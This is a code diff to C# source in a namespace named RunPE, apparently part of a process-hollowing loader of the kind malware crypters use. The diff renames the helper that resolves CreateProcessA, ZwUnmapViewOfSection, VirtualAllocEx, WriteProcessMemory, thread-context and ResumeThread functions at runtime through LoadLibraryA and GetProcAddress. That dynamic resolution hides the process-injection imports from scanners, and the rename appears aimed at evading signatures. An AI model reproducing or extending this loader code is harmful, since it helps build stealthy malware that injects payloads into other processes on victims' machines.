@@ -37,16 +37,16 @@ namespace RunPE
 
 
         #region API
-        private static readonly DelegateResumeThread ResumeThread = CreateApi<DelegateResumeThread>("kernel32", "ResumeThread");
-        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = CreateApi<DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");
-        private static readonly DelegateSetThreadContext SetThreadContext = CreateApi<DelegateSetThreadContext>("kernel32", "SetThreadContext");
-        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = CreateApi<DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");
-        private static readonly DelegateGetThreadContext GetThreadContext = CreateApi<DelegateGetThreadContext>("kernel32", "GetThreadContext");
-        private static readonly DelegateVirtualAllocEx VirtualAllocEx = CreateApi<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");
-        private static readonly DelegateWriteProcessMemory WriteProcessMemory = CreateApi<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");
-        private static readonly DelegateReadProcessMemory ReadProcessMemory = CreateApi<DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");
-        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = CreateApi<DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");
-        private static readonly DelegateCreateProcessA CreateProcessA = CreateApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");
+        private static readonly DelegateResumeThread ResumeThread = LoadApi<DelegateResumeThread>("kernel32", "ResumeThread");
+        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");
+        private static readonly DelegateSetThreadContext SetThreadContext = LoadApi<DelegateSetThreadContext>("kernel32", "SetThreadContext");
+        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi<DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");
+        private static readonly DelegateGetThreadContext GetThreadContext = LoadApi<DelegateGetThreadContext>("kernel32", "GetThreadContext");
+        private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");
+        private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");
+        private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi<DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");
+        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi<DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");
+        private static readonly DelegateCreateProcessA CreateProcessA = LoadApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");
         #endregion
 
 
@@ -55,7 +55,7 @@ namespace RunPE
         private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
         [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
         private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
-        private static CreateApi CreateApi<CreateApi>(string name, string method)
+        private static CreateApi LoadApi<CreateApi>(string name, string method)
         {
             return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
         }
